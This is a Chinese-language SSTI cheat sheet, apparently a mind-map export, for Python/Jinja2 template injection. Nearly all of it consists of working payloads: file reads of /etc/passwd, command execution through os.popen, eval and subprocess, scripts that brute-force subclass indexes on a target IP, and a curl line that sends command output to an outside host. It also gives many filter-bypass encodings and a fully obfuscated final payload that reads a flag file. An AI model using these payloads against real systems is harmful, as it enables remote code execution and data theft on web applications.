### 思路

naotu.baidu.com里面

```python
SSTI
	Python
		基础
			__class__：用来查看变量所属的类
			__bases__：用来查看类的基类\n[].__class__.__bases__[0]\n还能用 __mro__ 方法，__mro__ 方法\n().__class__.__mro__[1] \n__base__ 方法获取直接基类\n"".__class__.__base__
			__subclasses__()：查看当前类的子类组成的列表，即返回基类object的子类
			__builtins__：以一个集合的形式查看其引用
			__globals__：该方法会以字典的形式返回当前位置的所有全局变量
			__import__()：该方法用于动态加载类和函数
		利用方式
			读文件方法
				file类读文件
					只有python2可行
						{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
				<class '_frozen_importlib_external.FileLoader'>类读文件
					{{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
			命令执行
				eval执行
					python寻找子类
						for i in range(500):    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"    res = requests.get(url=url, headers=headers)    if 'eval' in res.text:        print(i)
					常用类
						warnings.catch_warnings\nWarningMessage\ncodecs.IncrementalEncoder\ncodecs.IncrementalDecoder\ncodecs.StreamReaderWriter\nos._wrap_close\nreprlib.Repr\nweakref.finalize
					{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
				os执行
					寻找子类
						for i in range(500):    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"    res = requests.get(url=url, headers=headers)    if 'os.py' in res.text:        print(i)
					{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}
				popen执行
					寻找子类
						for i in range(500):    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"    res = requests.get(url=url, headers=headers)    if 'popen' in res.text:        print(i)
					{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
				利用i<class '_frozen_importlib.BuiltinImporter'>类的load_module导入模块执行
					寻找子类
						for i in range(500):    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"    res = requests.get(url=url, headers=headers)    if '_frozen_importlib.BuiltinImporter' in res.text:        print(i)
					{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
				linecache函数搭配os执行
					寻找子类
						for i in range(500):    url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"    res = requests.get(url=url, headers=headers)    if 'linecache' in res.text:        print(i)
					{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
				subprocess.Popen类执行
					{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
			没有回显
				使用curl外带
					使用 {% if ... %}1{% endif %} 配合 os.popen 和 curl 外带
					{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `ls /|grep flag`') %}1{% endif %}
	Bypass ticker
		过滤了 .
			|attr() 绕过
				{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}
			使用 []
				{{ config['__class__']['__init__']['__globals__']['os']['popen']('ipconfig')['read']() }}
			使用__getattribute__
				"".__class__\n"".__getattribute__("__class__")
		过滤了 _
			编码绕过
				十六进制
					\x5f\x5f
			request对象绕过
		过滤了 []
			__getitem__() 绕过
				{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}
			pop() 绕过
				{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__("os").popen("ls /").read()')}}
			字典读取绕过
				{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
			get()
				{{url_for.__globals__.get('__builtins__')}}
			setdefault()
				{{url_for.__globals__.setdefault('__builtins__')}}
		过滤了 " '
			chr()绕过
				先获取chr()函数，赋值给chr，后面再拼接成一个字符串
				{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
			request对象绕过
				{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
				如果过滤了args，可以将其中的request.args改为request.values
		过滤了{{}}
			用Jinja2的 {%...%} 语句装载一个循环控制语句
				{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
			用 {% if ... %}1{% endif %} 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显
				{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls /' %}1{% endif %}
			用 {%print(......)%} 的形式来代替 {{
				{%print(''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read())%}
		过滤了 request/ class
			使用session/ config对象
				获取基类
					{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}
		过滤了__init__
			使用__enter__
				{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('ls /').read()}}
		过滤了关键词
			使用 request
				{{''[request.args.t1]}}&t1=__class__
				{{''[request['args']['t1']]}}&t1=__class__
			字符串拼接
				使用 +
					{{""["__cla"+"ss__"]}}
				使用 ' "
					[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
				使用 join
					[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
				使用 ~
					{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
			pyhon格式化绕过
				'{0:c}'.format(98)
				import redef product(poc):    payload=''    for chr in poc:        model="'{0:c}'['format'](%d)"%ord(chr)        payload+=model+'+'    return payload[:-1]a = product('__builtins__').replace('+',"%2b")print(a)#{{''.__class__.__mro__[1].__subclasses__()[65].__init__.__globals__['__builtins__']['eval']}}def decode(payload):    res = re.findall("\(\d+\)", payload)    for i in res:        print(chr(int(i[1:-1])), end = "")decode(a)
				"%c"%(98)
			编码绕过
				base64
					{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
				unicode
					{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}
				Hex
					{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}
			大小写绕过
				""["__CLASS__".lower()]
		过滤器的花样构造
			 attr用于获取变量
			format
				"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)=='__class__'
			random
				"".__class__.__mro__|last()\n相当于\n"".__class__.__mro__[-1]
			join
				""[['__clas','s__']|join] 或者 ""[('__clas','s__')|join]
			lower
				""["__CLASS__"|lower]
			replace reverse
				"__claee__"|replace("ee","ss") 构造出字符串 "__class__""__ssalc__"|reverse 构造出 "__class__"
			string
				构造出一些字符了，再通过拼接就能构成特定的字符串
				().__class__   出来的是<class 'tuple'>(().__class__|string)[0] 出来的是<
			select unique
				和上面的结合我们会拥有比前面更多的字符来用于拼接
				()|select|string\n结果如下\n<generator object select_or_reject at 0x0000022717FF33C0>
				(()|select|string)[24]~\n(()|select|string)[24]~\n(()|select|string)[15]~\n(()|select|string)[20]~\n(()|select|string)[6]~\n(()|select|string)[18]~\n(()|select|string)[18]~\n(()|select|string)[24]~\n(()|select|string)[24]\n\n\n得到字符串"__class__"
			list
				配合上面的string转换成列表，就可以调用列表里面的方法取字符了
			常用获取字符payload
				{% set org = ({ }|select()|string()) %}{{org}}
					尖号、字母、空格、下划线和数字
				{% set org = (self|string()) %}{{org}}
					尖号、字母和空格
				{% set org = self|string|urlencode %}{{org}}
					百分号
				{% set org = (app.__doc__|string) %}{{org}}
			数字的获取payload
				{% set num = (self|int) %}{{num}}    # 0, 通过int过滤器获取数字\n{% set num = (self|string|length) %}{{num}}    # 24, 通过length过滤器获取数字\n{% set point = self|float|string|min %}    # 通过float过滤器获取点 .
				有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算
					{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0\n{% set one = (zero**zero)|int %}{{one}}    # 1\n{%set two = (zero-one-one)|abs %}    # 2\n{%set three = (zero-one-one-one)|abs %}    # 3\n{% set five = (two*two*two)-one-one-one %}    # 5
			综合利用实例
				POCgithub中
```



### 通过过滤器构造

```python
# 首先构造出所需的数字: 
{% set zero = (self|int) %}    # 0, 也可以使用lenght过滤器获取数字
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set three = five-one-one %}    # 3
{% set nine = (two*two*two*two-five-one-one) %}    # 9
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串: 
{% set space = self|string|min %}    # 空格
{% set point = self|float|string|min %}    # .

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc = bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set yin = bfhc%((three~nine)|int) %}    # 使用%c构造引号 '
{% set xhx = bfhc%((nine~five)|int) %}    # 使用%c构造下划线 _
{% set right = bfhc%((four~one)|int) %}    # 使用%c构造右括号 )
{% set left = bfhc%((four~zero)|int) %}    # 使用%c构造左括号 (

{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set so = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx~xhx~but~xhx~xhx %}    # __builtins__

{% set ini = dict(ini=aa,t=bb)|join %}    # init
{% set glo = dict(glo=aa,bals=bb)|join %}    # globals
{% set itm = dict(ite=aa,ms=bb)|join %}    # items

# 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): 
{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}

# 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: 
{% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}    # globals
    {% if f == bul %} 
        {% for a,b in (v|attr(itm))() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}

# 最后的payload如下:
{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
```

如果过滤了`空格`

```python
{%%0aset%0azero%0a=%0a(self|int)%0a%}{%%0aset%0aone%0a=%0a(zero**zero)|int%0a%}{%%0aset%0atwo%0a=%0a(zero-one-one)|abs%0a%}{%%0aset%0afour%0a=%0a(two*two)|int%0a%}{%%0aset%0afive%0a=%0a(two*two*two)-one-one-one%0a%}{%%0aset%0athree%0a=%0afive-one-one%0a%}{%%0aset%0anine%0a=%0a(two*two*two*two-five-one-one)%0a%}{%%0aset%0aseven%0a=%0a(zero-one-one-five)|abs%0a%}{%%0aset%0aspace%0a=%0aself|string|min%0a%}{%%0aset%0apoint%0a=%0aself|float|string|min%0a%}{%%0aset%0ac%0a=%0adict(c=aa)|reverse|first%0a%}{%%0aset%0abfh%0a=%0aself|string|urlencode|first%0a%}{%%0aset%0abfhc%0a=%0abfh~c%0a%}{%%0aset%0aslas%0a=%0abfhc%((four~seven)|int)%0a%}{%%0aset%0ayin%0a=%0abfhc%((three~nine)|int)%0a%}{%%0aset%0axhx%0a=%0abfhc%((nine~five)|int)%0a%}{%%0aset%0aright%0a=%0abfhc%((four~one)|int)%0a%}{%%0aset%0aleft%0a=%0abfhc%((four~zero)|int)%0a%}{%%0aset%0abut%0a=%0adict(buil=aa,tins=dd)|join%0a%}{%%0aset%0aimp%0a=%0adict(imp=aa,ort=dd)|join%0a%}{%%0aset%0apon%0a=%0adict(po=aa,pen=dd)|join%0a%}{%%0aset%0aso%0a=%0adict(o=aa,s=dd)|join%0a%}{%%0aset%0aca%0a=%0adict(ca=aa,t=dd)|join%0a%}{%%0aset%0aflg%0a=%0adict(fl=aa,ag=dd)|join%0a%}{%%0aset%0aev%0a=%0adict(ev=aa,al=dd)|join%0a%}{%%0aset%0ared%0a=%0adict(re=aa,ad=dd)|join%0a%}{%%0aset%0abul%0a=%0axhx~xhx~but~xhx~xhx%0a%}{%%0aset%0aini%0a=%0adict(ini=aa,t=bb)|join%0a%}{%%0aset%0aglo%0a=%0adict(glo=aa,bals=bb)|join%0a%}{%%0aset%0aitm%0a=%0adict(ite=aa,ms=bb)|join%0a%}{%%0aset%0apld%0a=%0axhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right%0a%}{%%0afor%0af,v%0ain%0a(self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))()%}{%if%0af==bul%}{%for%0aa,b%0ain%0a(v|attr(itm))()%}{%if%0aa==ev%}{{b(pld)}}{%endif%}{%endfor%}{%endif%}{%endfor%}
```

